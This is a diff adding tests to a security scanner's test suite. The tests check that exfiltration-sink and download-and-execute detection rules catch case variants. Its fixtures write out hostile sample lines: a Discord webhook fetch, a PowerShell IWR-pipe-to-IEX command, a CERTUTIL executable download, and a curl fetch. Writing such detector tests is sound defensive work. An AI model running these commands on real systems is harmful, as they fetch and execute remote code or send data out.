@@ -64,6 +64,12 @@ describe('R13 network-exfil: hardcoded exfiltration sinks in string literals', (
     expect(findingOf(res.report!, 'R13')).toBeUndefined()
     expect(res.report!.verdict).toBe('clean')
   })
+
+  it('uppercase webhook host is caught (hostnames are case-insensitive)', () => {
+    const res = scan(codeRequest({ code: "fetch('https://DISCORD.COM/api/webhooks/1/2')" }))
+    expect(res.ok).toBe(true)
+    expect(findingOf(res.report!, 'R13', 'high')).toBeDefined()
+  })
 })
 
 describe('R14 non-JS scripts: download-and-exec primitives in shipped script files', () => {
@@ -116,6 +122,39 @@ describe('R14 non-JS scripts: download-and-exec primitives in shipped script fil
       const res = scan({ kind: 'files', files: [join(dir, 'go.bat')] })
       expect(res.ok).toBe(true)
       expect(findingOf(res.report!, 'R14', 'high')).toBeDefined()
+    })
+  })
+
+  it('uppercase IWR download-pipe is caught (PowerShell is case-insensitive)', () => {
+    withTmp({ 'dl.ps1': 'IWR -Uri http://e.com/x.ps1 | IEX\n' }, dir => {
+      const res = scan({ kind: 'files', files: [join(dir, 'dl.ps1')] })
+      expect(res.ok).toBe(true)
+      expect(findingOf(res.report!, 'R14', 'high')).toBeDefined()
+    })
+  })
+
+  it('uppercase CERTUTIL in a .cmd file is caught (cmd is case-insensitive)', () => {
+    withTmp({ 'go.cmd': 'CERTUTIL -urlcache -f http://e.com/x.exe x.exe\n' }, dir => {
+      const res = scan({ kind: 'files', files: [join(dir, 'go.cmd')] })
+      expect(res.ok).toBe(true)
+      expect(findingOf(res.report!, 'R14', 'high')).toBeDefined()
+    })
+  })
+
+  it('lowercase iex invoke-expression is caught', () => {
+    withTmp({ 'x.ps1': '$x = iex \'Get-Process\'\n' }, dir => {
+      const res = scan({ kind: 'files', files: [join(dir, 'x.ps1')] })
+      expect(res.ok).toBe(true)
+      expect(findingOf(res.report!, 'R14', 'high')).toBeDefined()
+    })
+  })
+
+  it('curl -o download-only is medium (not high, verdict stays clean)', () => {
+    withTmp({ 'get.sh': 'curl -o /tmp/x http://e.com/x\n' }, dir => {
+      const res = scan({ kind: 'files', files: [join(dir, 'get.sh')] })
+      expect(res.ok).toBe(true)
+      expect(findingOf(res.report!, 'R14', 'medium')).toBeDefined()
+      expect(res.report!.verdict).toBe('clean')
     })
   })
 })
